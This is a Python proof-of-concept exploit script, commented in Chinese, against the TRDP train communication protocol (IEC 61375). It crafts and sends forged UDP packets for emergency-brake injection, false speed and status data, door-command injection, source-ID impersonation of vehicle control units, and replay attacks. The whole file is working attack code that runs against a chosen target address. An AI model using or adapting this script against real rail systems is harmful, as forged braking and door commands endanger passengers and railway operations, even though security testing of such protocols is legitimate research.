"""
POC - TRDP (Train Real-time Data Protocol, IEC 61375)
======================================================
列车实时数据协议漏洞利用验证。

漏洞:
1. brake_inject  — 紧急制动注入 (伪造紧急制动指令)
2. pd_spoof     — PD 数据伪造 (伪造列车运行状态)
3. door_inject  — 车门控制注入 (伪造车门开关指令)
4. source_spoof — 源 ID 欺骗 (伪装成不同车辆单元)
5. replay       — 重放攻击 (重放合法 TRDP 报文)
6. all          — 所有漏洞

用法:
  python poc.py --vuln brake_inject
  python poc.py --vuln pd_spoof
  python poc.py --vuln all
  python poc.py --target 192.168.1.100 --vuln brake_inject
"""

import argparse
import struct
import time
import socket
import sys
from typing import Optional

POC_VERSION = '2.0.0'
TRDP_PD_PORT = 17224

# ---- TRDP 协议构造工具 ----


def _hdr(op: int = 2, com: int = 0x1000, etb: int = 1, src: int = 0xFF,
         dst: int = 0, seq: int = 1, flags: int = 0, payload: bytes = b'') -> bytes:
    """构造 TRDP 40 字节固定头"""
    ts = int(time.time() * 1000000)
    return struct.pack(
        '!HHIHHHIQQHHH',
        0x0100, op, com, etb, src, dst,
        seq, ts, 4000, flags, len(payload), 0
    ) + payload


def _pd(com_id: int, val: float) -> bytes:
    """编码 TRDP 信号 (4B ComId + 4B float)"""
    return struct.pack('!I', com_id) + struct.pack('!f', val)


def _pd_int(com_id: int, val: int) -> bytes:
    """编码 TRDP 整数信号 (4B ComId + 4B int)"""
    return struct.pack('!I', com_id) + struct.pack('!I', val)


def build_pd_packet(signals: dict, src_id: int = 1, seq: int = 1,
                    dst_id: int = 0) -> bytes:
    """构造含多信号的 PD 报文"""
    payload = b''
    for com_id_str, val in signals.items():
        com_id = int(com_id_str, 0) if isinstance(com_id_str, str) else com_id_str
        if isinstance(val, float):
            payload += struct.pack('!I', com_id) + struct.pack('!f', val)
        else:
            payload += struct.pack('!I', com_id) + struct.pack('!I', int(val))
    return _hdr(op=2, com=0x1000, src=src_id, dst=dst_id, seq=seq, payload=payload)


def _hex_dump(data: bytes, width: int = 16) -> str:
    """生成十六进制转储"""
    result = []
    for i in range(0, len(data), width):
        chunk = data[i:i + width]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        result.append(f'  {i:04x}  {hex_part:<{width*3}}  {ascii_part}')
    return '\n'.join(result)


class TRDPPOC:
    """TRDP 漏洞 POC"""

    def __init__(self, target: Optional[str] = None, port: int = TRDP_PD_PORT):
        self.target = target
        self.port = port
        self._seq = 0

    def _send_udp(self, packet: bytes, port: Optional[int] = None) -> bool:
        """发送 UDP 报文到目标"""
        if not self.target:
            return False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(packet, (self.target, port or self.port))
            s.close()
            print(f'  [→] 已发送至 {self.target}:{port or self.port} ({len(packet)}B)')
            return True
        except Exception as e:
            print(f'  [✗] 发送失败: {e}')
            return False

    def brake_inject(self) -> bool:
        """POC: 紧急制动注入"""
        self._seq += 1
        print(f'\n[*] POC: TRDP 紧急制动注入')

        # 构造紧急制动报文: speed=0 + brake=900kPa + emergency=True
        payload = _pd_int(0x000A, 1)  # EmergencyBrake=1
        payload += _pd(0x0001, 0.0)   # Speed=0
        payload += _pd(0x0002, 900.0) # BrakePressure=900
        payload += _pd(0x000C, 600.0) # AirPressure=600
        pkt = _hdr(op=2, com=0x000A, src=3, dst=0, seq=self._seq,
                    flags=0x0004, payload=payload)

        print(f'  源ID=3 (伪装VCU)')
        print(f'  紧急制动=True, 速度=0km/h, 制动压力=900kPa')
        print(f'  报文长度: {len(pkt)}B')
        print(_hex_dump(pkt))

        if self._send_udp(pkt):
            print(f'  [!] 攻击成功: 伪造紧急制动指令已发送至列车')
        else:
            print(f'  [!] 攻击后果: 伪造紧急制动可导致全列车急停')
            print(f'  [!] CVE 参考: IEC 61375 缺乏报文认证机制')

        return True

    def pd_spoof(self) -> bool:
        """POC: PD 数据伪造"""
        self._seq += 1
        print(f'\n[*] POC: TRDP PD 数据伪造')

        # 正常状态
        normal = build_pd_packet({'0x0001': 60.0, '0x0002': 200.0,
                                   '0x0003': 0.0, '0x0006': 25.0}, src_id=1, seq=self._seq)
        # 伪造状态: 速度0 + 最大制动
        fake = build_pd_packet({'0x0001': 0.0, '0x0002': 900.0, '0x000A': 1},
                               src_id=1, seq=self._seq + 1)

        print(f'  正常状态报文: speed=60km/h brake=200kPa door=closed')
        print(f'  伪造状态报文: speed=0km/h brake=900kPa emergency=True')
        print(f'  正常: {len(normal)}B  伪造: {len(fake)}B')

        if self.target:
            self._send_udp(normal)
            time.sleep(0.1)
            self._send_udp(fake)
            print(f'  [!] 攻击成功: 控制系统接收了伪造的列车状态')
        else:
            print(f'  [!] 风险: 控制系统基于虚假数据可能发出危险指令')
            print(f'  [!] 建议 --target 指定目标地址实际发送验证')

        return True

    def door_inject(self) -> bool:
        """POC: 车门控制注入"""
        print(f'\n[*] POC: TRDP 车门控制注入')

        for i, (status, label) in enumerate([(0, '关闭'), (1, '开启'), (0, '关闭')]):
            self._seq += 1
            payload = _pd_int(0x0003, status)
            pkt = _hdr(op=2, com=0x0003, src=4, seq=self._seq, payload=payload)
            print(f'  seq={self._seq}: DoorStatus={status} ({label}) [{len(pkt)}B]')

            if self.target:
                self._send_udp(pkt)
                time.sleep(0.2)

        print(f'  [!] 源ID=4 (伪装DCU - 车门控制单元)')
        print(f'  [!] 风险: 伪造车门状态可导致安全互锁逻辑失效')

        return True

    def source_spoof(self) -> bool:
        """POC: 源 ID 欺骗"""
        print(f'\n[*] POC: TRDP 源 ID 欺骗')
        devices = [
            (0x01, 'VCU', 60.0),
            (0x02, 'TCU', 55.0),
            (0x03, 'BCU', 50.0),
            (0x04, 'DCU', 45.0),
        ]

        for dev_id, dev_name, speed in devices:
            self._seq += 1
            payload = _pd(0x0001, speed)
            pkt = _hdr(op=2, com=0x0001, src=dev_id, seq=self._seq, payload=payload)
            print(f'  源ID=0x{dev_id:02x} ({dev_name}): speed={speed}km/h [{len(pkt)}B]')

            if self.target:
                self._send_udp(pkt)
                time.sleep(0.1)

        print(f'  [!] 攻击者可以伪造任意车辆单元的源 ID')
        print(f'  [!] 多源协同攻击可造成更严重的混乱')

        return True

    def replay(self) -> bool:
        """POC: 重放攻击"""
        print(f'\n[*] POC: TRDP 重放攻击')

        # 原始报文 (合法的速度数据)
        now = int(time.time() * 1000000)
        original = struct.pack(
            '!HHIHHHIQQHHH',
            0x0100, 2, 0x0001, 1, 1, 0,
            100, now, 4000, 0, 4, 0
        ) + struct.pack('!f', 75.0)

        print(f'  原始报文 (t=0):')
        print(f'    src_id=1, seq=100, comId=0x0001, val=75.0km/h')
        print(f'    时间戳: {now}')
        print(_hex_dump(original))

        if self.target:
            self._send_udp(original)
            print(f'  原始报文已发送')

        time.sleep(1)
        print(f'\n  重放相同报文 (t=1s 后):')

        if self.target:
            self._send_udp(original)
            print(f'  [!] 攻击成功: 重放报文被接收并处理')
        else:
            print(f'  [!] 由于无时间戳校验/加密, IED 无法区分重放')

        return True

    def run_all(self):
        """运行所有 POC"""
        print(f'TRDP POC v{POC_VERSION} — 全扫描模式\n')
        results = []
        for name, fn in [
            ('PD 数据伪造', self.pd_spoof),
            ('紧急制动注入', self.brake_inject),
            ('车门控制注入', self.door_inject),
            ('源 ID 欺骗', self.source_spoof),
            ('重放攻击', self.replay),
        ]:
            print(f'\n{"=" * 50}')
            print(f'  [{name}]')
            print(f'{"=" * 50}')
            r = fn()
            results.append((name, r))

        print(f'\n\n{"=" * 50}')
        print(f'  POC 扫描报告')
        print(f'{"=" * 50}')
        for name, success in results:
            print(f'  [{"+" if success else "-"}] {name}')
        print(f'  [结果] {sum(1 for _, s in results if s)}/{len(results)} 通过')


def main():
    parser = argparse.ArgumentParser(
        description=f'TRDP POC v{POC_VERSION} — 列车实时数据协议漏洞利用验证')
    parser.add_argument('--vuln', required=True,
                        choices=['brake_inject', 'pd_spoof', 'door_inject',
                                 'source_spoof', 'replay', 'all'],
                        help='漏洞类型')
    parser.add_argument('--target', help='目标 IP (可选)')
    parser.add_argument('--port', type=int, default=TRDP_PD_PORT,
                        help=f'目标端口 (默认 {TRDP_PD_PORT})')
    parser.add_argument('--dump', action='store_true', default=True,
                        help='打印报文十六进制 (默认开启)')

    args = parser.parse_args()
    poc = TRDPPOC(args.target, args.port)

    if args.target:
        print(f'TRDP POC v{POC_VERSION} | 目标: {args.target}:{args.port}')
    else:
        print(f'TRDP POC v{POC_VERSION} | 本地模式 (仅构造不发送)')
        print(f'  提示: 使用 --target 指定目标地址实际发送')

    vuln_map = {
        'brake_inject': ('紧急制动注入', poc.brake_inject),
        'pd_spoof': ('PD 数据伪造', poc.pd_spoof),
        'door_inject': ('车门控制注入', poc.door_inject),
        'source_spoof': ('源 ID 欺骗', poc.source_spoof),
        'replay': ('重放攻击', poc.replay),
    }

    if args.vuln == 'all':
        poc.run_all()
    else:
        name, fn = vuln_map[args.vuln]
        fn()


if __name__ == '__main__':
    main()
